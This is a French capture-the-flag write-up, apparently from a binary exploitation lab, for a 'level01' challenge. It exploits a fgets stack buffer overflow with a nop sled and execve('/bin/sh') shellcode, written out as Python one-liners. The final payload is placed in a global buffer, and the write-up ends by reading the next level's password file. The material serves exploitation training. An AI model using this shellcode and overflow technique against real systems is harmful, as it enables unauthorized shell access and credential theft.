level01:

On a un exécutable qui demande un username et un mot de passe. En explorant le binaire avec Ghidra on peut voir que le username est dat_wil et le mdp admin. Mais le programme indique wrong password même lorsqu'on entre admin...

Dans tous les cas il n'y a aucun appel à un admin shell donc on va devoir injecter notre propre shellcode. On remarque le fgets pour obtenir le mot de passe qui n'est pas sécurisé, il autorise une écriture de 100 caractères dans un buffer de 64.

On connait la musique, on prend un générateur de pattern et on voit que l'offset est à 80. On met un breakpoint juste après le fgets (b *0x08048579) sur le buffer qui nous intéresse, on lance le programme avec plein de A et on cherche a partir de quelle adresse ils apparaissent > 0xffffd6c0

On va print le user name puis une string de 80 caractères composés d'une nopsled puis de notre shellcode de 28 char puis des 4 char de l'adresse à la fin.
80 - (28 + 4) = 48 pour la nopsled

(python -c 'print "dat_wil\n" + "\x90" * 48 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xc0\xd6\xff\xff"') > /tmp/wow
cat /tmp/wow - | ./level01

Ca ne marche pas. Bon. Premièrement on remarque que si on run le programme dans gdb l'adresse d'eip n'est pas bien override. Il faut que la nopsled soit à 52 à la place. Et si le dernier byte de l'adresse d'override d'EIP est supérieur à \xbb il est automatiquement set à \xfd (donc on skip notre code). Peut-être une protection de mémoire ?

Dans tous les cas on peut également essayer de placer le shellcode dans le premier buffer (comme strcmp va s'arrêter après dat_wil, et que le buffer est large). De plus c'est une variable globale donc on aura peut-être moins de problème de pointage.

En regardant avec Ghidra on voit que la var a_user_name a l'adresse 0x0804a040, + 7 pour skip dat_wil 0x0804a048 \x48\xa0\x04\x08

(python -c 'print "dat_wil" + "\x90" * 50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\n" + "A" * 80 + "\x48\xa0\x04\x08"') > /tmp/wow

(cat /tmp/wow; cat /home/users/level02/.pass) | ./level01

C'est bon on a notre password